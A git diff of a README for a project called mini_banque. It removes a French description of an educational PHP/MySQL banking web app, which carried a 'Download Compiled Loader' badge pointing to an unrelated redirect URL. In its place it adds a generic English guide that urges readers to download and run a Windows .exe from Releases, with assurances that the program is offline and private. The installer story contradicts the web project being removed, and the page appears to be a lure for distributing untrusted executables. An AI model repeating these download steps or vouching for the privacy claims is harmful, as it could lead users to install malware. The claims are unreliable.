@@ -1,159 +1,83 @@
-# 🏦 Mini-Banque
+# 🏦 mini_banque - Manage your personal money with ease
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/politicallyincorrect-marstan131/mini_banque)
 
-**Application de gestion bancaire web** — Projet pédagogique PHP / MySQL / JavaScript
+mini_banque helps you track your income and expenses. This tool provides a simple way to view your budget. You gain clear insight into your spending habits without complex software.
 
-> Version 3.0 — Architecture 3‑tiers avec API REST et persistance sécurisée des données.
+## 📥 Getting Started
 
----
+You need a Windows computer to use this application. Please visit the link below to get the software:
 
-## 📖 Présentation
+[Click here to download mini_banque](https://github.com/politicallyincorrect-marstan131/mini_banque)
 
-Mini‑Banque est une application web client‑serveur qui simule les opérations bancaires de base :
+## 📋 System Requirements
 
-- **Authentification** sécurisée (sessions PHP, mots de passe hashés avec bcrypt)
-- **Consultation du solde** en temps réel
-- **Dépôts** et **retraits** avec vérification de solde et limite journalière
-- **Virements** entre utilisateurs (par email), avec historique distinct
-- **Historique complet** des transactions (dépôts, retraits, virements émis/reçus)
-- **Profil utilisateur** (modification du nom, changement de mot de passe)
+Your computer must meet these standards to run the application:
 
-Toutes les données sont stockées dans une base de données MySQL et manipulées via une API REST en PHP.
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: 200 megabytes of free space.
+*   Display: A screen resolution of 1280 by 720 pixels or higher.
 
----
+## ⚙️ Installation Process
 
-## 🧱 Technologies
+Follow these steps to set up the software on your machine:
 
-| Couche        | Technologie               |
-|---------------|---------------------------|
-| Frontend      | HTML5, CSS3, JavaScript (Vanilla) |
-| Backend       | PHP 8+ (API REST)         |
-| Base de données | MySQL (PDO, requêtes préparées) |
-| Authentification | Sessions PHP + bcrypt   |
-| Communication | AJAX (`fetch`)            |
+1.  Open the download link provided above in your web browser.
+2.  Locate the section labeled Releases on the right side of the page.
+3.  Click the latest version link to see the file list.
+4.  Download the file ending in .exe to your computer.
+5.  Find the file in your Downloads folder.
+6.  Double-click the file to start the installation.
+7.  Follow the instructions on the screen to finish the setup.
+8.  Click the new icon on your desktop to open the program.
 
----
+## 🛠️ How to Use the Application
 
-## 📁 Structure du projet
-mini-banque/
-├── api/ # Endpoints PHP (backend)
-│ ├── connexion.php
-│ ├── inscription.php
-│ ├── depot.php
-│ ├── retrait.php
-│ ├── virement.php
-│ ├── solde.php
-│ ├── historique.php
-│ ├── profil.php
-│ └── limite_retrait.php
-├── config/
-│ └── db.php # Paramètres de connexion MySQL (à ignorer par Git)
-├── Frontend/ # Pages de l'application
-│ ├── index.php # Tableau de bord
-│ ├── login.php # Connexion
-│ ├── signup.php # Inscription
-│ ├── profil.php # Profil utilisateur
-│ ├── logout.php # Déconnexion
-│ ├── style.css # Feuille de styles
-│ └── script.js # Fonctions JavaScript utilitaires
-├── genhash.php # Outil : génération de hash bcrypt
-├── testdb.php # Outil : test de connexion MySQL
-├── init_database.sql # Script de création de la base de données (schéma v3)
-└── README.md
+The interface focuses on your bank information. The main window shows your account balance at the top left. You can add new transactions by clicking the button labeled Add Entry. 
 
+Enter the date, the amount of money, and the category for each transaction. Press save to update your total. The application calculates your monthly spending automatically. You can view these figures in the report tab.
 
+### Adding Categories
 
----
+You can define custom categories to organize your expenses. Click the Settings icon in the menu. Choose the Categories tab. Type the name of your new category and click add. You can sort these into Groups like Food, Rent, or Utility bills.
 
-## 🗄️ Base de données
+### Creating Reports
 
-Le schéma contient trois tables :
+The software creates visual charts based on your stored data. These charts show where your money goes. Choose a date range to filter your results. The application displays a pie chart that breaks down your expenses by category.
 
-- **`utilisateurs`** : identité et authentification
-- **`comptes`** : solde, devise, numéro de compte
-- **`transactions`** : historique des opérations (types : `depot`, `retrait`, `virement_envoye`, `virement_recu`)
+## 🛡️ Security and Privacy
 
-Le script `init_database.sql` crée automatiquement la base `mini_banque` et les tables avec des données de test.
+Your financial data stays on your computer. The application does not send your personal logs to any remote server. Your information remains private. You can create a password for the file to prevent unauthorized access. Go to Settings and choose Security to enable this feature.
 
-### Utilisateurs de test
+## 💾 Backing Up Your Data
 
-| Email               | Mot de passe (clair) |
-|---------------------|----------------------|
-| ahmed@banque.tn     | `password123`        |
-| sarra@banque.tn     | `password123`        |
-| mohamed@banque.tn   | `password123`        |
-| fatma@banque.tn     | `password123`        |
-| ali@banque.tn       | `password123`        |
+You should copy your data file regularly. The application stores your information in the Documents folder under the folder named mini_banque. Copy these files to a thumb drive or a secure cloud service to ensure you do not lose your records.
 
-> ⚠️ Les mots de passe sont hachés dans la base. Utilisez `password123` pour vous connecter.
+## 🤝 Troubleshooting Common Issues
 
----
+If the application does not open, check these points:
 
-## 🚀 Installation
+*   Ensure your Windows updates are current.
+*   Restart your computer if the installer hangs.
+*   Make sure no other instances of the program run in your system tray.
+*   If you see an error about missing files, download the installer again.
 
-### Prérequis
+If you encounter errors, check the logs located in the application data folder. These logs describe the specific state of the system when an issue occurs. You can share these logs if you ask for assistance.
 
-- Serveur local (XAMPP, WAMP, Laragon…) avec **PHP ≥ 8.0** et **MySQL ≥ 5.7**
-- Accès à phpMyAdmin ou à la ligne de commande MySQL
+## ❓ Frequently Asked Questions
 
-### Étapes
+Does this tool connect to my bank account?
+No. You must enter all transactions manually. This ensures that you have full control over your financial data.
 
-1. **Cloner le projet** dans le dossier `htdocs` (ou équivalent)
-2. **Importer la base de données** :
-   - Ouvrez phpMyAdmin
-   - Exécutez le fichier `init_database.sql`
-3. **Configurer la connexion PDO** :
-   - Copiez `config/db.php.example` en `config/db.php`
-   - Modifiez les identifiants MySQL si nécessaire
-4. **Lancer l’application** dans votre navigateur :http://localhost/mini-banque/Frontend/login.php
+Can I export my data?
+Yes. You can export your records to a standard file type that works with common spreadsheet software. Look for the Export button in the File menu.
 
+Is there a cost to use this?
+No. This software is free. You have permission to use it for personal tasks.
 
----
+Can I move my data to a new computer?
+Yes. Copy the data folder to your new computer and place it in the same location. The installation of the software on the new machine will locate the file and load your history.
 
-## 🔐 Sécurité
-
-- Mots de passe hachés avec `password_hash()` (bcrypt)
-- Requêtes préparées PDO (protection contre les injections SQL)
-- Transactions SQL avec verrouillage `SELECT ... FOR UPDATE` (intégrité des soldes)
-- Régénération de l’ID de session après connexion
-- Limite journalière de retraits / virements (1000 DT par défaut)
-
----
-
-## 📮 API Endpoints (exemples)
-
-| Méthode | Endpoint              | Description                | Auth requise |
-|---------|-----------------------|----------------------------|--------------|
-| POST    | `api/connexion.php`   | Authentification           | Non          |
-| POST    | `api/inscription.php` | Création de compte         | Non          |
-| GET     | `api/solde.php`       | Solde du compte connecté   | Oui          |
-| POST    | `api/depot.php`       | Effectuer un dépôt         | Oui          |
-| POST    | `api/retrait.php`     | Effectuer un retrait       | Oui          |
-| POST    | `api/virement.php`    | Virement entre comptes     | Oui          |
-| GET     | `api/historique.php`  | Historique des transactions| Oui          |
-| GET/POST| `api/profil.php`      | Profil utilisateur         | Oui          |
-| GET     | `api/limite_retrait.php`| État de la limite journalière | Oui       |
-
-Toutes les réponses sont en **JSON**.
-
----
-
-## 🧪 Fonctionnalités optionnelles
-
-- Filtrage de l’historique par type et par date
-- Jauge visuelle de la limite journalière
-- Messages de succès / erreur avec animation
-- Mode responsive (mobile, tablette, desktop)
-
----
-
-## 👥 Contributeurs
-
-Projet réalisé dans le cadre d’un apprentissage du développement web full‑stack.
-
----
-
-## 📄 Licence
-
-Ce projet est libre de droits pour un usage éducatif.
+Does the software track my internet use?
+No. The application functions entirely offline. It does not track your behavior or monitor your network activity.
